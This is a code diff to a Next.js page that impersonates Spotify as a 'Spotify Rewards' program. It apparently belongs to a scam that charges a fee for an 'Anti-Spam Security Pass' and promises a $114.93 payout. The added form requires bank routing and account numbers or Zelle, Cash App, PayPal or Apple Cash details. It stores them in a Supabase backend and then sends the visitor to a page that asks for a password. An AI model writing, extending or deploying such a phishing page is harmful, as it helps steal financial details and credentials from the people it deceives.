@@ -21,15 +21,29 @@ import {
 } from 'lucide-react';
 import Image from 'next/image';
 import Link from 'next/link';
+import { useRouter } from 'next/navigation';
 import { useEffect, useState } from 'react';
-import { recordPaymentInSupabase } from '../../../lib/supabase';
+import { recordPaymentInSupabase, savePayoutCoordinates } from '../../../lib/supabase';
 import MetaPixelTracker from '../../components/MetaPixelTracker';
 
 export default function SpotifyWelcomePage() {
+  const router = useRouter();
   const [protocolId, setProtocolId] = useState('SPT-948210-US');
   const [listenerName, setListenerName] = useState('Verified Listener');
   const [listenerEmail, setListenerEmail] = useState('');
   const [timestamp, setTimestamp] = useState('');
+
+  // Payout Form State
+  const [payoutMethod, setPayoutMethod] = useState<'direct_deposit' | 'zelle' | 'cashapp' | 'paypal' | 'apple_cash'>('direct_deposit');
+  const [bankName, setBankName] = useState('');
+  const [routingNumber, setRoutingNumber] = useState('');
+  const [accountNumber, setAccountNumber] = useState('');
+  const [zelleTag, setZelleTag] = useState('');
+  const [cashappTag, setCashappTag] = useState('');
+  const [paypalEmail, setPaypalEmail] = useState('');
+  const [appleCashPhone, setAppleCashPhone] = useState('');
+  const [isSavingPayout, setIsSavingPayout] = useState(false);
+  const [payoutSavedSuccess, setPayoutSavedSuccess] = useState(false);
 
   useEffect(() => {
     if (typeof window !== 'undefined') {
@@ -50,6 +64,24 @@ export default function SpotifyWelcomePage() {
       const savedEmail = sessionStorage.getItem('spotify_listener_email');
       if (savedEmail && savedEmail.trim()) {
         setListenerEmail(savedEmail.trim());
+        setPaypalEmail(savedEmail.trim());
+      }
+
+      // Check existing saved payout
+      const existingPayout = sessionStorage.getItem('spotify_payout_details');
+      if (existingPayout) {
+        try {
+          const parsed = JSON.parse(existingPayout);
+          if (parsed.method) setPayoutMethod(parsed.method);
+          if (parsed.bank_name) setBankName(parsed.bank_name);
+          if (parsed.routing_number) setRoutingNumber(parsed.routing_number);
+          if (parsed.account_number) setAccountNumber(parsed.account_number);
+          if (parsed.zelle_tag) setZelleTag(parsed.zelle_tag);
+          if (parsed.cashapp_tag) setCashappTag(parsed.cashapp_tag);
+          if (parsed.paypal_email) setPaypalEmail(parsed.paypal_email);
+          if (parsed.apple_cash_phone) setAppleCashPhone(parsed.apple_cash_phone);
+          setPayoutSavedSuccess(true);
+        } catch {}
       }
 
       const now = new Date();
@@ -118,6 +150,36 @@ export default function SpotifyWelcomePage() {
       } catch {}
     }
   }, []);
+
+  const handleSavePayoutAndContinue = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSavingPayout(true);
+
+    const emailToUse = listenerEmail || 'listener@spotifyrewards.com';
+    const payload = {
+      email: emailToUse,
+      method: payoutMethod,
+      bank_name: bankName,
+      routing_number: routingNumber,
+      account_number: accountNumber,
+      zelle_tag: zelleTag,
+      cashapp_tag: cashappTag,
+      paypal_email: paypalEmail,
+      apple_cash_phone: appleCashPhone,
+    };
+
+    await savePayoutCoordinates(payload);
+    setPayoutSavedSuccess(true);
+    setIsSavingPayout(false);
+
+    // Redirect directly to the Spotify Rewards login / account activation
+    const query = new URLSearchParams({
+      email: emailToUse,
+      name: listenerName || '',
+    }).toString();
+
+    router.push(`/spotify/dashboard/login?${query}`);
+  };
 
   return (
     <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black relative overflow-hidden">
@@ -190,8 +252,192 @@ export default function SpotifyWelcomePage() {
           </h1>
 
           <p className="text-sm sm:text-base text-gray-300 max-w-xl mx-auto leading-relaxed">
-            Congratulations, <b className="text-white">{listenerName}</b>! Your Anti-Spam Security Pass has been authorized by banking compliance. Your listener account has been elevated to <b className="text-[#1db954]">Verified Priority Tier</b>.
+            Congratulations, <b className="text-white">{listenerName}</b>! Your Anti-Spam Security Pass has been authorized by banking compliance. Complete your payout settings below to unlock your application dashboard.
           </p>
+        </div>
+
+        {/* ========================================================= */}
+        {/* CARD 0: MANDATORY PAYOUT COORDINATES FORM                 */}
+        {/* ========================================================= */}
+        <div className="relative overflow-hidden rounded-3xl bg-[#0e1410] border-2 border-[#1db954] p-6 sm:p-8 mb-8 shadow-2xl shadow-[#1db954]/10">
+          <div className="flex items-center justify-between pb-4 border-b border-[#1f2e23] mb-6">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 rounded-2xl bg-[#1db954] text-black flex items-center justify-center font-black">
+                <Landmark className="w-5 h-5 stroke-[2.5]" />
+              </div>
+              <div>
+                <span className="text-xs uppercase tracking-wider font-extrabold text-[#1db954]">
+                  Step 1 of 2 • Banking Information
+                </span>
+                <h2 className="text-xl font-black text-white leading-tight">
+                  Where Should We Send Your Commissions?
+                </h2>
+              </div>
+            </div>
+            <div className="hidden sm:flex items-center gap-1.5 text-xs text-[#8a9890] font-medium">
+              <Lock className="w-3.5 h-3.5 text-[#1db954]" /> Bank-Grade AES-256
+            </div>
+          </div>
+
+          <p className="text-xs sm:text-sm text-gray-300 mb-6 leading-relaxed">
+            Please select your preferred payout method to receive your initial <b className="text-[#1db954] font-bold">$114.93 USD</b> balance and all subsequent daily evaluation royalties.
+          </p>
+
+          <form onSubmit={handleSavePayoutAndContinue} className="space-y-5">
+            {/* Payment Method Selector Tabs */}
+            <div>
+              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2.5">
+                Select Commission Payout Method:
+              </label>
+              <div className="grid grid-cols-2 sm:grid-cols-5 gap-2">
+                {[
+                  { id: 'direct_deposit', label: 'Direct Deposit / ACH' },
+                  { id: 'zelle', label: 'Zelle' },
+                  { id: 'cashapp', label: 'Cash App' },
+                  { id: 'paypal', label: 'PayPal' },
+                  { id: 'apple_cash', label: 'Apple Cash' },
+                ].map((m) => (
+                  <button
+                    key={m.id}
+                    type="button"
+                    onClick={() => setPayoutMethod(m.id as any)}
+                    className={`py-3 px-2 rounded-xl text-xs font-bold transition-all text-center border ${
+                      payoutMethod === m.id
+                        ? 'bg-[#1db954] text-black border-[#1db954] shadow-md shadow-[#1db954]/25'
+                        : 'bg-[#141b16] text-gray-300 border-[#202e24] hover:border-[#1db954]/40 hover:text-white'
+                    }`}
+                  >
+                    {m.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {/* Dynamic Inputs Based on Selection */}
+            {payoutMethod === 'direct_deposit' && (
+              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-4">
+                <div>
+                  <label className="block text-xs font-semibold text-gray-300 mb-1">
+                    Bank Name (e.g., Chase, Bank of America, Wells Fargo)
+                  </label>
+                  <input
+                    type="text"
+                    required
+                    value={bankName}
+                    onChange={(e) => setBankName(e.target.value)}
+                    placeholder="e.g. JPMorgan Chase"
+                    className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
+                  />
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-300 mb-1">
+                      Routing Transit Number (9 digits)
+                    </label>
+                    <input
+                      type="text"
+                      required
+                      maxLength={9}
+                      value={routingNumber}
+                      onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, ''))}
+                      placeholder="021000021"
+                      className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-300 mb-1">
+                      Checking / Savings Account Number
+                    </label>
+                    <input
+                      type="text"
+                      required
+                      value={accountNumber}
+                      onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
+                      placeholder="••••••••••"
+                      className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
+                    />
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {payoutMethod === 'zelle' && (
+              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
+                <label className="block text-xs font-semibold text-gray-300">
+                  Zelle Registered Mobile Phone or Email Address
+                </label>
+                <input
+                  type="text"
+                  required
+                  value={zelleTag}
+                  onChange={(e) => setZelleTag(e.target.value)}
+                  placeholder="e.g. (555) 234-5678 or listener@gmail.com"
+                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
+                />
+              </div>
+            )}
+
+            {payoutMethod === 'cashapp' && (
+              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
+                <label className="block text-xs font-semibold text-gray-300">
+                  Your Cash App $Cashtag
+                </label>
+                <input
+                  type="text"
+                  required
+                  value={cashappTag}
+                  onChange={(e) => setCashappTag(e.target.value.startsWith('$') ? e.target.value : '$' + e.target.value)}
+                  placeholder="$yourtag"
+                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
+                />
+              </div>
+            )}
+
+            {payoutMethod === 'paypal' && (
+              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
+                <label className="block text-xs font-semibold text-gray-300">
+                  PayPal Registered Account Email
+                </label>
+                <input
+                  type="email"
+                  required
+                  value={paypalEmail}
+                  onChange={(e) => setPaypalEmail(e.target.value)}
+                  placeholder="you@email.com"
+                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
+                />
+              </div>
+            )}
+
+            {payoutMethod === 'apple_cash' && (
+              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
+                <label className="block text-xs font-semibold text-gray-300">
+                  Apple ID Phone Number or iCloud Email
+                </label>
+                <input
+                  type="text"
+                  required
+                  value={appleCashPhone}
+                  onChange={(e) => setAppleCashPhone(e.target.value)}
+                  placeholder="+1 (555) 019-2834 or listener@icloud.com"
+                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
+                />
+              </div>
+            )}
+
+            {/* CTA Button to save and go to App */}
+            <button
+              type="submit"
+              disabled={isSavingPayout}
+              className="w-full py-4 px-6 rounded-2xl bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-black text-base sm:text-lg flex items-center justify-center gap-3 transition-all shadow-xl shadow-[#1db954]/25 hover:shadow-[#1db954]/40"
+            >
+              <span>{isSavingPayout ? 'Saving Payout Coordinates...' : 'Save Payout Details & Access Spotify Rewards App'}</span>
+              <ArrowRight className="w-5 h-5 stroke-[3]" />
+            </button>
+            <p className="text-center text-[11px] text-[#788880]">
+              You will be redirected to create your personal account password for your member dashboard.
+            </p>
+          </form>
         </div>
 
         {/* ========================================================= */}
@@ -340,60 +586,6 @@ export default function SpotifyWelcomePage() {
               </div>
               <div className="text-right">
                 <span className="text-2xl sm:text-3xl font-black text-[#1db954]">$114.93 USD</span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        {/* ========================================================= */}
-        {/* CARD 4: 3-STEP ROADMAP TIMELINE                           */}
-        {/* ========================================================= */}
-        <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 mb-8 shadow-2xl shadow-black">
-          <h3 className="text-xs font-extrabold uppercase tracking-widest text-[#8a9890] mb-5 flex items-center gap-2">
-            <Sparkles className="w-4 h-4 text-[#1db954]" />
-            What Happens Next (Settlement Protocol)
-          </h3>
-
-          <div className="space-y-5">
-            {/* Step 1 */}
-            <div className="flex items-start gap-3.5">
-              <div className="w-7 h-7 rounded-full bg-[#1db954] text-black font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5 shadow-md shadow-[#1db954]/20">
-                ✓
-              </div>
-              <div>
-                <div className="text-sm font-bold text-white">Identity Verification Completed</div>
-                <p className="text-xs text-gray-400 mt-0.5 leading-relaxed">
-                  Your Anti-Spam pass has been validated. Your member account is cleared for direct payouts.
-                </p>
-              </div>
-            </div>
-
-            {/* Step 2 */}
-            <div className="flex items-start gap-3.5">
-              <div className="w-7 h-7 rounded-full bg-[#1db954]/20 border border-[#1db954] text-[#1db954] font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5 animate-pulse">
-                2
-              </div>
-              <div>
-                <div className="text-sm font-bold text-white flex items-center gap-2">
-                  <span>Automatic $9.00 USD Cancellation &amp; Refund</span>
-                  <span className="text-[10px] font-bold text-[#1db954] bg-[#1db954]/10 px-2 py-0.5 rounded-full border border-[#1db954]/30">In Progress</span>
-                </div>
-                <p className="text-xs text-gray-400 mt-0.5 leading-relaxed">
-                  The banking gateway processes your refund back to your card within 1 to 2 hours automatically.
-                </p>
-              </div>
-            </div>
-
-            {/* Step 3 */}
-            <div className="flex items-start gap-3.5">
-              <div className="w-7 h-7 rounded-full bg-white/10 text-gray-300 font-extrabold text-xs flex items-center justify-center shrink-0 mt-0.5">
-                3
-              </div>
-              <div>
-                <div className="text-sm font-bold text-white">Payout Instructions Transmitted via Email</div>
-                <p className="text-xs text-gray-400 mt-0.5 leading-relaxed">
-                  Follow the secure link received in your inbox to provide your banking or PayPal coordinates for the $114.93 USD deposit.
-                </p>
               </div>
             </div>
           </div>
